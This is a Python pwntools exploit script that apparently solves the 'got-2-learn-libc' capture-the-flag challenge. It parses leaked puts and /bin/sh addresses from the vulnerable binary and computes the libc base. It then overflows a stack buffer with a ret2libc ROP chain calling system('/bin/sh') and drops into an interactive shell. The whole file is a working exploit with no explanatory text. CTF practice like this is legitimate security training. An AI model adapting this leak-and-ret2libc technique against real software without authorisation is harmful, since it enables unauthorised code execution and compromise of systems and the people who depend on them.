#! /usr/bin/env python
from pwn import process, log, context, p32, u32
from pwn import ELF
context.clear(arch='i386', os='linux')


def main():
    elf_name = '/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln'
    libc_name = 'libc.so.6'
    elf = ELF(elf_name)
    libc = ELF(libc_name)
    OFFSET_buf_to_eip = 0x9c + 4

    p = process(elf_name)

    p.recvuntil('puts: ')
    leak = p.recvline(keepends=False)
    ADDR_puts = int(leak, 16)

    p.recvuntil('useful_string: ')
    leak = p.recvline(keepends=False)
    ADDR_bin_sh = int(leak, 16)

    # Calculate libc base
    libc.address = ADDR_puts - libc.symbols['puts']
    ADDR_system = libc.symbols['system'] # + 3 # +3 to avoid null byte on address
    ADDR_exit = libc.symbols['exit']

    log.info("puts    @ %s", hex(ADDR_puts))
    log.info("libc    @ %s", hex(libc.address))
    log.info("system  @ %s", hex(ADDR_system))
    log.info("exit    @ %s", hex(ADDR_exit))
    log.info("/bin/sh @ %s", hex(ADDR_bin_sh))

    ropchain = p32(ADDR_system)
    ropchain += p32(ADDR_exit)
    ropchain += p32(ADDR_bin_sh)

    payload = 'A' * OFFSET_buf_to_eip
    payload += ropchain

    p.sendlineafter('string:\n', payload)

    p.sendlineafter('now...\n', 'cd /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/')
    p.sendline('ls -l')
    p.interactive()


if __name__ == "__main__":
    main()
